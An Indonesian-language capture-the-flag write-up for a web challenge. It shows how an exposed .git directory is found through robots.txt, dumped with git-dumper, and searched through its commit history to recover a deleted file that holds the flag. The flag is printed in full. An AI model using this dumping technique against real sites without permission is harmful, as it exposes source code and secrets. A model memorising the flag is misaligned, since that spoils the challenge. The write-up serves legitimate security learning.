**Kategori:** Web / Source Disclosure  <br>
**Flag:** `HCS{gH4R0wWWWwwWwwwwwwwWWwWWW_k1n6_617hUB_6U3_4ku1N_}`  <br>
**AI Chat:** https://chat.ragita.net/s/4372749b-fef8-4181-adcb-93b032a81d5f <br>

---

## 1. Deskripsi Challenge

Web dengan tampilan awal yang cuma berisi teks-teks "ape ape":

> eh ape · ape kek · ape aje · ape ape · ape sih

Tidak ada input, form, maupun fitur apa pun. Karena permukaannya kosong, asumsi awal: **exploit-nya ada di path/file yang tidak ditautkan** — arah ke information disclosure lewat file yang tertinggal di server.

---

## 2. Recon: `robots.txt`

Coba akses `robots.txt`:

```
http://ape-77621e174d8d.challenge.hcs-team.com/robots.txt
```

```
User-agent: *
Disallow: /.git/
```

`Disallow: /.git/` → **direktori `.git` terekspos** ke publik. Ini bocornya seluruh repository beserta history commit-nya.

---

## 3. Dump Repository `.git`

Cek file umum git dulu untuk memastikan benar-benar ada:

```
/.git/HEAD      -> ada
/.git/config    -> ada
```

Karena keduanya ada, seluruh repo bisa direkonstruksi. Untuk mengotomasi clone `.git` yang terekspos dipakai tools **git-dumper**:

```bash
git-dumper http://ape-77621e174d8d.challenge.hcs-team.com/.git/ repo/
```

Hasilnya struktur `.git` lengkap ter-download (hooks, logs, objects, refs, `COMMIT_EDITMSG`, `config`, `index`, dst).

---

## 4. Analisis History Commit

Buka repo hasil dump di VSCode. Ada **dua commit**:

```
* clean up before going live   (main, HEAD)   apesihape-dev
|     M  README_INTERNAL.md
|     D  internal.txt          <- file dihapus di commit ini
* wip: internal staging notes  (bf9564f)       apesihape-dev
      A  README_INTERNAL.md
      A  internal.txt          <- file ditambahkan di sini
```

Commit **HEAD** ("clean up before going live") **menghapus** `internal.txt` — jadi di working tree terbaru file itu sudah lenyap. `README_INTERNAL.md` sendiri cuma decoy:

```
Internal staging notes.
(cleaned up before going live)
```

Kunci: lihat **commit sebelumnya** (`wip: internal staging notes`, `bf9564f`) yang masih punya `internal.txt`.

---

## 5. Ambil File yang Sudah Dihapus

Checkout / lihat versi `internal.txt` pada commit `bf9564f`:

```bash
git show bf9564f:internal.txt
```

Isinya flag:

```
HCS{gH4R0wWWWwwWwwwwwwwWWwWWW_k1n6_617hUB_6U3_4ku1N_}
```

---

## 6. Verifikasi

Flag berformat `HCS{...}` dan didapat dari file `internal.txt` yang **hanya hidup di history**, bukan di working tree terbaru. Ini menegaskan tema challenge: `git rm` tidak menghapus jejak — isinya masih tersimpan di commit lama selama `.git` terekspos. 
_Solved!_
